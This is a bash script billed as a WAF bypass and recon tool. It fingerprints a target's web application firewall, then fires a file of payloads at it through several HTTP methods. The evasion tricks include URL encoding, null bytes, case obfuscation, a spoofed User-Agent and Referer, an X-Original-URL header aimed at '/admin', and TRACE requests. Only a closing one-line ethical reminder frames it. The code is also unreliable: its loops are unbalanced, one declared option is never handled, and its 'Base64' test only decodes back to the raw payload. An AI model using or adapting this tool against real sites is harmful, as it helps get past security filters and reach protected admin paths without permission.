#!/bin/bash

# Ultimate Multi-Feature WAF Bypass & Recon Tool by kdairatchi

# Color Definitions
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[1;36m'
NC='\033[0m'

# Default Configuration
TARGET_URL=""
PAYLOAD_FILE="payloads.txt"
PROXY=""
RATE_LIMIT="100k"
DELAY=2
USER_AGENT="Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0 Mobile Safari/537.36"
REFERER="https://trusted-site.com"

usage() {
    echo -e "${CYAN}Usage:${NC} $0 -d target_url [-p payload_file] [-u user_agent] [-x proxy] [-r rate_limit] [-t delay] [-w wordlist]"
    exit 1
}

# Parse Arguments
while getopts "d:p:u:x:r:t:w:" opt; do
    case "$opt" in
        d) TARGET_URL="$OPTARG";;
        p) PAYLOAD_FILE="$OPTARG";;
        u) USER_AGENT="$OPTARG";;
        x) PROXY="$OPTARG";;
        r) RATE_LIMIT="$OPTARG";;
        t) DELAY="$OPTARG";;
        *) usage;;
    esac
done

if [ -z "$TARGET_URL" ]; then
    usage
fi

# WAF Detection
if command -v wafw00f >/dev/null 2>&1; then
    echo -e "${GREEN}[+] Running WAF Detection (wafw00f)${NC}"
    wafw00f "$TARGET_URL"
else
    echo -e "${RED}[!] wafw00f not installed. Skipping WAF detection.${NC}"
fi

# Payload Testing Loop
if [ -f "$PAYLOAD_FILE" ]; then
    METHODS=(GET POST PUT OPTIONS PATCH)
    while read -r PAYLOAD; do
        URL_ENCODED_PAYLOAD=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$PAYLOAD'''))")
        BASE64_PAYLOAD=$(echo -n "$PAYLOAD" | base64)
        NULL_BYTE_PAYLOAD="${PAYLOAD}%00"
        CASE_OBFUSCATION=$(echo "$PAYLOAD" | sed 's/[a-zA-Z]/\u&/g')

        techniques=(
            "$PAYLOAD"
            "$URL_ENCODED_PAYLOAD"
            "$NULL_BYTE_PAYLOAD"
            "$CASE_OBFUSCATION"
        )

        for METHOD in "${METHODS[@]}"; do
            for TECHNIQUE in "${techniques[@]}"; do
                echo -e "${GREEN}[+] Method: ${YELLOW}$METHOD${NC} | Payload: ${CYAN}$TECHNIQUE${NC}"
                curl -X "$METHOD" "$TARGET_URL" \
                    -d "$TECHNIQUE" \
                    -H "User-Agent: $USER_AGENT" \
                    -H "Referer: $REFERER" \
                    ${PROXY:+-x "$PROXY"} \
                    --limit-rate "$RATE_LIMIT" \
                    --max-time 30
                sleep "$DELAY"
            done
            
        echo -e "${YELLOW}[+] Testing Base64 Encoded Payload${NC}"
        curl -X GET "$TARGET_URL" \
            -d "$(echo $BASE64_PAYLOAD | base64 -d)" \
            -H "X-Original-URL: /admin" \
            -H "Referer: $REFERER" \
            ${PROXY:+-x "$PROXY"} \
            --limit-rate "$RATE_LIMIT" \
            --max-time 30
        sleep "$DELAY"
        
                # trace Payload 
        echo -e "${YELLOW}[+] Testing Trace Encoded Payload${NC}"
        curl -X TRACE "$TARGET_URL" \
            -d "$(echo $BASE64_PAYLOAD | base64 -d)" \
            -H "User-Agent: $USER_AGENT" \
            -H "Referer: $REFERER" \
            ${PROXY:+-x "$PROXY"} \
            --limit-rate "$RATE_LIMIT" \
            --max-time 30
        sleep "$DELAY"
        # Base64 Payload Test
        echo -e "${YELLOW}[+] Testing Base64 Encoded Payload${NC}"
        curl -X POST "$TARGET_URL" \
            -d "$(echo $BASE64_PAYLOAD | base64 -d)" \
            -H "User-Agent: $USER_AGENT" \
            -H "Referer: $REFERER" \
            ${PROXY:+-x "$PROXY"} \
            --limit-rate "$RATE_LIMIT" \
            --max-time 30
        sleep "$DELAY"

    done < "$PAYLOAD_FILE"
else
    echo -e "${RED}[!] Payload file not found: $PAYLOAD_FILE${NC}"
fi

# Ethical Reminder
echo -e "${YELLOW}[!] Always ensure ethical usage and obtain explicit permission before testing any target.${NC}"
